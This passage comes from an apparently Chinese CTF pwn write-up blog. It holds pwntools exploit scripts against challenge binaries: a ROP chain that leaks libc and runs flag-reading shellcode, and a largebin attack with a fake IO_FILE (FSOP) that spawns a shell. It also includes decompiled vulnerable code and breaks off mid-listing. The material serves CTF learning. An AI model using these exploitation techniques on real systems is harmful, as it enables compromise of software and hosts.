class="hljs-string">@防护</span><br><span class="hljs-string">    Arch:     amd64-64-little</span><br><span class="hljs-string">    RELRO:    Partial RELRO</span><br><span class="hljs-string">    Stack:    No canary found</span><br><span class="hljs-string">    NX:       NX enabled</span><br><span class="hljs-string">    PIE:      No PIE (0x3ff000)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> pwnlib<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br>REMOTE = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> REMOTE:<br>    p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28080</span>)<br>    libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>    libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_sum</span>(<span class="hljs-params">msg</span>):<br>    result = <span class="hljs-number">0</span><br>    key = <span class="hljs-string">&quot;fakeipheadfa&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>        result = result ^ u16(key[i*<span class="hljs-number">2</span>:<span class="hljs-number">2</span>*i+<span class="hljs-number">2</span>]) <span class="hljs-comment">#0x140b</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(msg)//<span class="hljs-number">2</span>):<br>        <span class="hljs-keyword">if</span> i!=<span class="hljs-number">8</span>:<br>            result = result ^ u16(msg[i*<span class="hljs-number">2</span>:<span class="hljs-number">2</span>*i+<span class="hljs-number">2</span>])<br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_msg</span>(<span class="hljs-params">idx,data</span>):<br>    msg = p16(<span class="hljs-number">0x766E</span>) <span class="hljs-comment"># magic</span><br>    msg += p16(<span class="hljs-number">0x28B7</span>) <span class="hljs-comment"># magic</span><br>    msg += p32(idx) <span class="hljs-comment"># index</span><br>    msg += p32(<span class="hljs-number">1</span>) <span class="hljs-comment"># fixed number</span><br>    msg += p16(<span class="hljs-number">0x6</span>) <span class="hljs-comment"># type:0x5/0x6</span><br>    msg += p16(<span class="hljs-number">1</span>) <span class="hljs-comment"># </span><br>    msg += p16(<span class="hljs-number">0xffff</span>) <span class="hljs-comment"># hash</span><br>    msg += p16(<span class="hljs-number">0</span>) <span class="hljs-comment"># fixed number</span><br>    msg += p16(<span class="hljs-number">1</span>) <span class="hljs-comment"># branch</span><br>    msg += p16(<span class="hljs-number">0xffff</span>) <span class="hljs-comment"># len(head)=24B</span><br>    msg = msg + data<br>    msg = msg[:<span class="hljs-number">0x10</span>] + p16(calc_sum(msg)) + msg[<span class="hljs-number">0x12</span>:]<br>    <span class="hljs-keyword">return</span> msg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">idx, data</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;4. Quit.\n&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>)<br>    sleep(<span class="hljs-number">2</span>)<br>    success(<span class="hljs-string">&quot;send data: &quot;</span> + <span class="hljs-built_in">hex</span>(idx))<br>    data = get_msg(idx, data)<br>    p.send(data)<br>    sleep(<span class="hljs-number">6</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;4. Quit.\n&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>)<br>    sleep(<span class="hljs-number">2</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;Which?&quot;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">submit</span>():<br>    p.sendlineafter(<span class="hljs-string">&quot;4. Quit.\n&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>)<br>    sleep(<span class="hljs-number">2</span>)<br><br>pop_rdi = <span class="hljs-number">0x401bb3</span><br>pop_rsi_r15 = <span class="hljs-number">0x401bb1</span><br>main = <span class="hljs-number">0x401A5E</span><br><br>create(<span class="hljs-number">1</span>,cyclic(<span class="hljs-number">0xfe8</span>))<br>create(<span class="hljs-number">0x1001</span>,cyclic(<span class="hljs-number">0xfe8</span>))<br>create(<span class="hljs-number">0x2001</span>,cyclic(<span class="hljs-number">0xfe8</span>))<br><br>payload = cyclic(<span class="hljs-number">0x70</span>)<br>payload += p64(pop_rsi_r15)<br>payload += p64(elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]) + p64(<span class="hljs-number">0</span>)<br>payload += p64(elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]) + p64(main)<br>payload += cyclic(<span class="hljs-number">0xf50</span>)<br><br>create(<span class="hljs-number">0x3001</span>,payload)<br>submit()<br>p.recvuntil(<span class="hljs-string">&quot;Done.\n&quot;</span>)<br>libc.address = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x26fc0</span><br>success(<span class="hljs-built_in">hex</span>(libc.address))<br><br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">2</span>)<br>delete(<span class="hljs-number">3</span>)<br><br>create(<span class="hljs-number">1</span>,cyclic(<span class="hljs-number">0xfe8</span>))<br>create(<span class="hljs-number">0x1001</span>,cyclic(<span class="hljs-number">0xfe8</span>))<br>create(<span class="hljs-number">0x2001</span>,cyclic(<span class="hljs-number">0xfe8</span>))<br><br>rop = ROP(libc)<br>rop.mprotect(<span class="hljs-number">0x404000</span>,<span class="hljs-number">0x1000</span>,<span class="hljs-number">7</span>)<br>rop.read(<span class="hljs-number">0</span>,<span class="hljs-number">0x404600</span>,<span class="hljs-number">0x100</span>)<br>rop.call(<span class="hljs-number">0x404600</span>)<br>success(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(rop.chain())))<br><br>payload = cyclic(<span class="hljs-number">0x6a</span>)<br>payload += rop.chain()<br>payload += cyclic(<span class="hljs-number">0xef6</span>)<br><br>create(<span class="hljs-number">0x3001</span>,payload)<br><span class="hljs-comment"># gdb.attach(p,&quot;b *0x401A5D&quot;)</span><br>submit()<br><br>p.recv()<br><span class="hljs-comment"># pause()</span><br>p.sendline(asm(shellcraft.cat(<span class="hljs-string">&quot;./flag&quot;</span>)))<br><br><span class="hljs-comment"># pwnlib.gdb.attach(p)</span><br>p.interactive()<br>p.close()<br></code></pre></td></tr></table></figure>

<h3 id="Summary-2"><a href="#Summary-2" class="headerlink" title="Summary"></a>Summary</h3><ul>
<li>对于这种需要逆向的题目不要看了题目就傻乎乎地逆向，不妨看一下题目名字，logo等信息参照现实技术类推一下，可能会有助于加速逆向过程。</li>
</ul>
<h3 id="Reference-2"><a href="#Reference-2" class="headerlink" title="Reference"></a>Reference</h3><ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LynneHuan/p/15890280.html#easyroptocol">https://www.cnblogs.com/LynneHuan/p/15890280.html#easyroptocol</a></li>
</ul>
<h2 id="FShuiMaster"><a href="#FShuiMaster" class="headerlink" title="FShuiMaster"></a>FShuiMaster</h2><h3 id="基本信息-3"><a href="#基本信息-3" class="headerlink" title="基本信息"></a>基本信息</h3><ul>
<li>libc版本：<code>2.27-3ubuntu1_amd64</code></li>
<li>file FShuiMaster</li>
</ul>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">FShuiMaster</span>: ELF <span class="hljs-number">64</span>-bit LSB shared object, x86-<span class="hljs-number">64</span>, version <span class="hljs-number">1</span> (SYSV), dynamically linked, interpreter /home/sh0ve1/glibc-<span class="hljs-literal">all</span>-in-one/libs/<span class="hljs-number">2</span>.<span class="hljs-number">27</span>-<span class="hljs-number">3</span>ubuntu1_amd64/ld-<span class="hljs-number">2</span>.<span class="hljs-number">27</span>.so, for GNU/Linux <span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>, BuildID[sha1]=<span class="hljs-number">6</span>e20c52a10d729e416b1c45dc26224f04f64249c, not stripped<br></code></pre></td></tr></table></figure>

<ul>
<li>保护机制：保护全开</li>
</ul>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Arch:</span>     amd64<span class="hljs-number">-64</span>-little<br><span class="hljs-symbol">RELRO:</span>    Full RELRO<br><span class="hljs-symbol">Stack:</span>    Canary found<br><span class="hljs-symbol">NX:</span>       NX enabled<br><span class="hljs-symbol">PIE:</span>      PIE enabled<br></code></pre></td></tr></table></figure>

<h3 id="程序分析-3"><a href="#程序分析-3" class="headerlink" title="程序分析"></a>程序分析</h3><p>增：有一个全局变量计数申请次数，最多只能100次，且以该变量作为堆块数组和堆块大小数组的下标。堆块大小限制在0x42F和0x700之间，并且会检查申请的堆块是否在heap段;<br>删：给程序提交下标，然后检查下标释放小于全局变量且堆块数组的对应位置处非空，通过即释放堆块，且将地址和大小都置为0；<br>改：给程序提交下标，然后检查下标释放小于全局变量且堆块数组的对应位置处非空，通过即根据堆块大小数组存储的size输入数据。但是自定义的输入函数存在 <code>off-by-null</code> 漏洞</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs awk">__int64 __fastcall get_Input(__int64 addr, unsigned __int64 num)<br>&#123;<br>  char buf; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">1</span>Fh] [rbp-<span class="hljs-number">11</span>h] BYREF<br>  unsigned __int64 i; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">20</span>h] [rbp-<span class="hljs-number">10</span>h]<br>  unsigned __int64 v5; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">28</span>h] [rbp-<span class="hljs-number">8</span>h]<br><br>  v5 = __readfsqword(<span class="hljs-number">0</span>x28u);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>LL; i &lt; num; ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">1</span>uLL) &lt;= <span class="hljs-number">0</span> )<br>      <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> ( buf == <span class="hljs-string">&#x27;\n&#x27;</span> )<br>    &#123;<br>      *(_BYTE *)(addr + i) = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>    *(_BYTE *)(i + addr) = buf;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( i == num )<br>    *(_BYTE *)(addr + num) = <span class="hljs-number">0</span>;                 <span class="hljs-regexp">//</span> off-by-null<br>  return <span class="hljs-number">0</span>LL;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>查：给程序提交下标，然后检查下标释放小于全局变量且堆块数组的对应位置处非空，通过即利用puts函数打印堆块内容</p>
<p>退出：使用exit(-1)退出程序</p>
<h3 id="利用思路-3"><a href="#利用思路-3" class="headerlink" title="利用思路"></a>利用思路</h3><p>首先利用脏数据泄露出libc基址和heap地址；</p>
<p>然后利用<code>off-by-null</code>漏洞构造<code>chunk overlapping</code>，从而进行<code>largebin attack</code>修改<code>__IO_list_all</code>为一个堆块地址;</p>
<p>在堆块中伪造一个IO_FILE,然后使用exit()函数刷新即可。</p>
<h3 id="Exp-3"><a href="#Exp-3" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@文件        :exp.py</span><br><span class="hljs-string">@说明        :largebin attack(free) + FSOP</span><br><span class="hljs-string">@时间        :2022/02/16 10:10:28</span><br><span class="hljs-string">@作者        :sh0ve1</span><br><span class="hljs-string">@防护</span><br><span class="hljs-string">    Arch:     amd64-64-little</span><br><span class="hljs-string">    RELRO:    Full RELRO</span><br><span class="hljs-string">    Stack:    Canary found</span><br><span class="hljs-string">    NX:       NX enabled</span><br><span class="hljs-string">    PIE:      PIE enabled</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> pwnlib<br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br>REMOTE = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> REMOTE:<br>    p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29061</span>)<br>    libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&#x27;./FShuiMaster&#x27;</span>)<br>    libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./FShuiMaster&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;Five: Finished!\n&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>    p.sendlineafter(<span class="hljs-string">&quot;Number of words?\n&quot;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendlineafter(<span class="hljs-string">&quot;please input U character\n&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;Five: Finished!\n&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>    p.sendlineafter(<span class="hljs-string">&quot;change\n&quot;</span>,<span class="hljs-built_in">str</span>(index))<br>    p.sendafter(<span class="hljs-string">&quot;\n&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;Five: Finished!\n&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>    p.sendlineafter(<span class="hljs-string">&quot;please Input The page U want 2 scan&quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;Five: Finished!\n&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>    p.sendlineafter(<span class="hljs-string">&quot;tear off&quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit0</span>():<br>    p.sendlineafter(<span class="hljs-string">&quot;Five: Finished!\n&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">5</span>))<br><br><br>p.sendlineafter(<span class="hljs-string">&quot;Please Write U Name on the Book\n\n&quot;</span>, <span class="hljs-string">&quot;sh0ve1&quot;</span>)<br>add(<span class="hljs-number">0x440</span>,<span class="hljs-string">b&#x27;AA&#x27;</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x458</span>,<span class="hljs-string">b&#x27;BB&#x27;</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x4f0</span>,<span class="hljs-string">b&#x27;CC&#x27;</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x4f0</span>,<span class="hljs-string">b&#x27;DD&#x27;</span>) <span class="hljs-comment">#3</span><br><br>delete(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x450</span> + p64(<span class="hljs-number">0x8b0</span>))<br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x440</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x7</span>) <span class="hljs-comment"># 4</span><br>show(<span class="hljs-number">4</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;AAAAAAA\n&#x27;</span>)<br>libc.address = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ec2a0</span><br>success(<span class="hljs-built_in">hex</span>(libc.address))<br><br>add(<span class="hljs-number">0x450</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0xf</span>) <span class="hljs-comment"># 5 1</span><br>show(<span class="hljs-number">5</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;BB\n&#x27;</span>)<br>heapbase = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x6a0</span><br>success(<span class="hljs-built_in">hex</span>(heapbase))<br><br>add(<span class="hljs-number">0x4f0</span>,<span class="hljs-string">b&#x27;CC&#x27;</span>) <span class="hljs-comment">#6</span><br><br><span class="hljs-comment">#(fp + 0xE8 ) (fp-&gt;_IO_buf_base); // call qword ptr [fp+E8h]</span><br><span class="hljs-comment"># exit(0) --&gt; _IO_flush_all_lockp ---&gt; IO_OVERFLOW()(_finish:0x18,_overflow:0x20)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getshell_by_str_jumps_finish_when_exit_v224_v229</span>(<span class="hljs-params"> _IO_str_jumps_addr:<span class="hljs-built_in">int</span>, system_addr:<span class="hljs-built_in">int</span>, bin_sh_addr:<span class="hljs-built_in">int</span></span>):<br>    fake_file = FileStructure()<br>    fake_file.flags = <span class="hljs-number">0</span><br>    fake_file._IO_read_ptr = <span class="hljs-number">0x61</span><br>    fake_file.unknown2 = <span class="hljs-number">0</span><br>    fake_file._IO_write_base = <span class="hljs-number">0x0</span><br>    fake_file._IO_write_ptr = <span class="hljs-number">0x1</span><br>    fake_file._IO_buf_base = bin_sh_addr<br>    fake_file.vtable = _IO_str_jumps_addr - <span class="hljs-number">8</span> <span class="hljs-comment">#offset=0xd8 </span><br>    fake_file = fake_file.__bytes__() + p64(<span class="hljs-number">0</span>) + p64(system_addr) <br>    <span class="hljs-keyword">return</span> fake_file<br><br>fake_file = getshell_by_str_jumps_finish_when_exit_v224_v229(libc.address + <span class="hljs-number">0x3e8360</span>,libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>],libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>).__next__())<br><span class="hljs-comment"># gdb.attach(p)</span><br>delete(<span class="hljs-number">1</span>)<br>payload = flat(&#123;<span class="hljs-number">0x58</span>:heapbase + <span class="hljs-number">0x1500</span> +<span class="hljs-number">0x110</span>, <span class="hljs-comment"># 伪造stderr的_chain(offset=0x68),指向伪造的stdout,即fake_file</span><br>    <span class="hljs-number">0xb0</span>:<span class="hljs-number">0xffffffff</span>, <span class="hljs-comment">#stderr的mode</span><br>    <span class="hljs-number">0x100</span>:fake_file&#125;)+<span class="hljs-string">b&#x27;\n&#x27;</span><br><br>add(<span class="hljs-number">0x460</span>,payload) <span class="hljs-comment"># 7</span><br>add(<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;GAP&#x27;</span>) <span class="hljs-comment"># 8</span><br>edit(<span class="hljs-number">5</span>,p64(<span class="hljs-number">0x3ec0a0</span>+libc.address) + p64(libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>] - <span class="hljs-number">0x10</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>) <span class="hljs-comment"># 修改_IO_list_all为7的堆头地址 BK-&gt;fd = victim(5)</span><br>delete(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">0x500</span>,<span class="hljs-string">&quot;FF&quot;</span>) <span class="hljs-comment"># 9 | trigger largebin attack(free)</span><br><br><span class="hljs-comment"># gdb.attach(p)</span><br>exit0()<br><br>p.interactive()<br>p.close()<br><br></code></pre></td></tr></table></figure>

<h3 id="Summary-3"><a href="#Summary-3" class="headerlink" title="Summary"></a>Summary</h3><ul>
<li>由于<code>largebin attack</code>攻击之后<code>_IO_list_all</code>指向的是一个堆块的头部，所以有0x10字节不可控，因此不在该堆块直接伪造用于攻击的<code>IO_FILE</code>，而是伪造成另一个<code>IO_FILE</code>,并使其<code>_chain</code>字段指向用于攻击的<code>IO_FILE</code>，此外<code>mode</code>字段为<code>0xffffffff</code>,其余字段不考虑。</li>
</ul>
<h3 id="Reference-3"><a href="#Reference-3" class="headerlink" title="Reference"></a>Reference</h3><ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LynneHuan/p/15890280.html#fshuimaster">https://www.cnblogs.com/LynneHuan/p/15890280.html#fshuimaster</a></li>
</ul>
<h2 id="HideOnHeap"><a href="#HideOnHeap" class="headerlink" title="HideOnHeap"></a>HideOnHeap</h2><h3 id="基本信息-4"><a href="#基本信息-4" class="headerlink" title="基本信息"></a>基本信息</h3><ul>
<li><p>libc版本：<code>2.31-0ubuntu9.2</code></p>
</li>
<li><p>file HideOnHeap</p>
</li>
</ul>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">HideOnHeap</span>: ELF <span class="hljs-number">64</span>-bit LSB shared object, x86-<span class="hljs-number">64</span>, version <span class="hljs-number">1</span> (SYSV), dynamically linked, interpreter /home/sh0ve1/glibc-<span class="hljs-literal">all</span>-in-one/libs/<span class="hljs-number">2</span>.<span class="hljs-number">31</span>-<span class="hljs-number">0</span>ubuntu9.<span class="hljs-number">2</span>_amd64/ld-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so, for GNU/Linux <span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>, BuildID[sha1]=<span class="hljs-number">6</span>f18ca73f584b1eadf5290c63100c61b3918cc7f, stripped<br></code></pre></td></tr></table></figure>

<ul>
<li>保护机制:保护全开</li>
</ul>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Arch:</span>     amd64<span class="hljs-number">-64</span>-little<br><span class="hljs-symbol">RELRO:</span>    Full RELRO<br><span class="hljs-symbol">Stack:</span>    Canary found<br><span class="hljs-symbol">NX:</span>       NX enabled<br><span class="hljs-symbol">PIE:</span>      PIE enabled<br></code></pre></td></tr></table></figure>

<h3 id="程序分析-4"><a href="#程序分析-4" class="headerlink" title="程序分析"></a>程序分析</h3><p>程序在一开始申请了一个堆块，并将flag读取到该堆块中</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">ssize_t</span> <span class="hljs-title">startup</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> fd; <span class="hljs-comment">// ebp</span><br>  <span class="hljs-type">char</span> *flag_addr; <span class="hljs-comment">// rax</span><br><br>  <span class="hljs-built_in">setbuf</span>(stdin, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">setbuf</span>(stderr, <span class="hljs-number">0LL</span>);<br>  fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./flag&quot;</span>, <span class="hljs-number">0</span>);<br>  flag_addr = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>uLL);<br>  <span class="hljs-built_in">read</span>(fd, flag_addr + <span class="hljs-number">0x60</span>, <span class="hljs-number">0x30</span>uLL);<br>  <span class="hljs-built_in">close</span>(fd);<br>  <span class="hljs-built_in">alarm</span>(<span class="hljs-number">0x3C</span>u);<br>  ......<br>&#125;<br></code></pre></td></tr></table></figure>

<p>该程序存在堆块的申请、释放和编辑功能</p>
<p>根据Size数组是否为0来分配堆块下标，最多可以有32个，可申请的size足够大。申请成功之后，将堆块指针和size存放到对应下标的heap_array和Size数组中</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">ssize_t</span> <span class="hljs-title">add</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 v0; <span class="hljs-comment">// rax</span><br>  __int64 idx; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-type">int</span> size; <span class="hljs-comment">// er12</span><br>  <span class="hljs-type">void</span> *addr; <span class="hljs-comment">// rax</span><br><br>  v0 = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">while</span> ( <span 